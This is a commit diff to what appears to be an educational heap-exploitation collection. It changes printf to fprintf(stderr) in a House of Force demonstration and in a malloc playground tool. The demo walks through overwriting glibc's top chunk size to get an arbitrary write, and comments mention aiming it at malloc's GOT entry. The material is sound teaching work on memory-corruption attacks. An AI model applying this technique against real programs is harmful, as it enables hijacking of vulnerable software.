b393796b178c5464386c594934b00a12b3085f16
Javier Jimenez <javier@sensepost.com>
2017-10-13 16:07:38 +0100

    REFACTOR: Exchange printf for fprintf - prevents heap usage.

--- house_of_force.c
+++ house_of_force.c
@@ -21,68 +21,68 @@ char bss_var[] = "This is a string that we want to overwrite.";
 
 int main(int argc , char* argv[])
 {
-	printf("\nWelcome to the House of Force\n\n");
-	printf("The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
-	printf("The top chunk is a special chunk. Is the last in memory "
+	fprintf(stderr, "\nWelcome to the House of Force\n\n");
+	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
+	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
 		"and is the chunk that will be resized when malloc asks for more space from the os.\n");
 
-	printf("\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
-	printf("Its current value is: %s\n", bss_var);
+	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
+	fprintf(stderr, "Its current value is: %s\n", bss_var);
 
 
 
-	printf("\nLet's allocate the first chunk, taking space from the wilderness.\n");
+	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
 	intptr_t *p1 = malloc(256);
-	printf("The chunk of 256 bytes has been allocated at %p.\n", p1);
+	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1);
 
-	printf("\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
+	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
 	int real_size = malloc_usable_size(p1);
-	printf("Real size (aligned and all that jazz) of our allocated chunk is %d.\n", real_size);
+	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %d.\n", real_size);
 
-	printf("\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
+	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");
 
 	//----- VULNERABILITY ----
 	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
-	printf("\nThe top chunk starts at %p\n", ptr_top);
+	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
 
-	printf("\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
-	printf("Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
+	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
+	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
 	ptr_top[0] = -1;
-	printf("New size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
+	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
 	//------------------------
 
-	printf("\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
+	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
 	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
 	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");
 
 	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
-	printf("\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
+	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
 	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
 	void *new_ptr = malloc(evil_size);
-	printf("As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);
+	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);
 
 	void* ctr_chunk = malloc(100);
-	printf("\nNow, the next chunk we overwrite will point at our target buffer.\n");
-	printf("malloc(100) => %p!\n", ctr_chunk);
-	printf("Now, we can finally overwrite that value:\n");
+	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
+	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
+	fprintf(stderr, "Now, we can finally overwrite that value:\n");
 
-	printf("... old string: %s\n", bss_var);
-	printf("... doing strcpy overwrite with \"YEAH!!!\"...\n");
+	fprintf(stderr, "... old string: %s\n", bss_var);
+	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
 	strcpy(ctr_chunk, "YEAH!!!");
-	printf("... new string: %s\n", bss_var);
+	fprintf(stderr, "... new string: %s\n", bss_var);
 
 
 	// some further discussion:
-	//printf("This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
-	//printf("This because the main_arena->top pointer is setted to current av->top + malloc_size "
+	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
+	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
 	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
-	//printf("In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
-	//printf("The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
-	//printf("After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
+	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
+	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
+	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
 	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");
 
-	//printf("The large chunk with evil_size has been allocated here 0x%08x\n",p2);
-	//printf("The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
+	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
+	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);
 
-	//printf("This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
+	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
 }
--- malloc_playground.c
+++ malloc_playground.c
@@ -7,7 +7,7 @@
 # include <mcheck.h>
 void print_mcheck_status(enum mcheck_status s)
 {
-	printf("%s\n", (s == MCHECK_DISABLED) ? "N/A, you didn't enable mcheck()" :
+	fprintf(stderr, "%s\n", (s == MCHECK_DISABLED) ? "N/A, you didn't enable mcheck()" :
 				   (s == MCHECK_OK) ? "No inconsistency detected" :
 				   (s == MCHECK_HEAD) ? "Memory preceding an allocated block was clobbered" :
 				   (s == MCHECK_TAIL) ? "Memory following an allocated block was clobbered" :
@@ -16,49 +16,49 @@ void print_mcheck_status(enum mcheck_status s)
 }
 void report_mcheck_fail(enum mcheck_status s)
 {
-	printf("*** PROGRAM WOULD ABORT: "); print_mcheck_status(s);
+	fprintf(stderr, "*** PROGRAM WOULD ABORT: "); print_mcheck_status(s);
 }
 #endif
 
 int main(int argc, char ** argv) {
 	char buffer[1000];
 	while (1) {
-		printf("> ");
+		fprintf(stderr, "> ");
 		fgets(buffer, sizeof(buffer), stdin);
 		char cmd[1000];
 		intptr_t arg1, arg2;
 		int num = sscanf(buffer, "%s %"SCNiPTR" %"SCNiPTR, cmd, &arg1, &arg2);
 		if (strcmp(cmd, "malloc") == 0) {
 			void* result = malloc(arg1);
-			printf("==> %p\n", result);
+			fprintf(stderr, "==> %p\n", result);
 		} else if (strcmp(cmd, "free") == 0) {
 			free((void*) arg1);
-			printf("==> ok\n");
+			fprintf(stderr, "==> ok\n");
 		} else if (strcmp(cmd, "show") == 0) {
 			if (num == 2) {
 				arg2 = 1;
 			}
 			long * src = (long*) arg1;
 			for (int i = 0; i < arg2; i++) {
-				printf("%p: %#16.0lx\n", &src[i], src[i]);
+				fprintf(stderr, "%p: %#16.0lx\n", &src[i], src[i]);
 			}
 #ifdef __GLIBC__
 		} else if (strcmp(cmd, "usable") == 0) {
-			printf("usable size: %zu\n", malloc_usable_size((void*) arg1));
+			fprintf(stderr, "usable size: %zu\n", malloc_usable_size((void*) arg1));
 		} else if (strcmp(cmd, "stats") == 0) {
 			malloc_stats();
 		} else if (strcmp(cmd, "info") == 0) {
 			malloc_info(0, stdout);
 		} else if (strcmp(cmd, "mcheck") == 0) {
-			printf("==> %s\n", mcheck(report_mcheck_fail) == 0 ? "OK" : "ERROR");
+			fprintf(stderr, "==> %s\n", mcheck(report_mcheck_fail) == 0 ? "OK" : "ERROR");
 		} else if (strcmp(cmd, "mcheck_pedantic") == 0) {
-			printf("==> %s\n", mcheck_pedantic(report_mcheck_fail) == 0 ? "OK" : "ERROR");
+			fprintf(stderr, "==> %s\n", mcheck_pedantic(report_mcheck_fail) == 0 ? "OK" : "ERROR");
 		} else if (strcmp(cmd, "mprobe") == 0) {
 			if (num > 1) {
 				print_mcheck_status(mprobe((void*) arg1));
 			} else {
 				mcheck_check_all();
-				printf("==> check_all ok\n");
+				fprintf(stderr, "==> check_all ok\n");
 			}
 #endif
 		} else {
